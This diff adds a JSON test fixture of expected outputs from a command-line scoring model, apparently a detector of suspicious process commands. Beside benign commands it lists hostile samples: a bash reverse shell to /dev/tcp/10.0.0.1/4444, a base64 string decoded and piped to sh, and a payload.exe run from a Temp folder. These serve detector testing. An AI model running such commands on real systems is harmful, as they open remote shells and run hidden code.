@@ -1,0 +1,34 @@
+{
+  "model": "cmdline_scorer.onnx",
+  "n_features": 9,
+  "cases": [
+    {
+      "cmdline": "/usr/bin/bash\u0000-l\u0000",
+      "score": 0.06054219603538513
+    },
+    {
+      "cmdline": "ls\u0000-la\u0000/home/user\u0000",
+      "score": 0.0698670744895935
+    },
+    {
+      "cmdline": "curl\u0000-fsS\u0000https://example.test/health\u0000",
+      "score": -0.02560192346572876
+    },
+    {
+      "cmdline": "/usr/bin/python3\u0000/usr/local/bin/app.py\u0000--serve\u0000",
+      "score": -0.08381402492523193
+    },
+    {
+      "cmdline": "sh\u0000-c\u0000echo cHdk | base64 --decode | sh\u0000",
+      "score": -0.11438041925430298
+    },
+    {
+      "cmdline": "bash\u0000-i\u0000>&\u0000/dev/tcp/10.0.0.1/4444\u00000>&1\u0000",
+      "score": -0.15175044536590576
+    },
+    {
+      "cmdline": "C:\\Users\\bob\\AppData\\Local\\Temp\\payload.exe\u0000",
+      "score": -0.08445358276367188
+    }
+  ]
+}
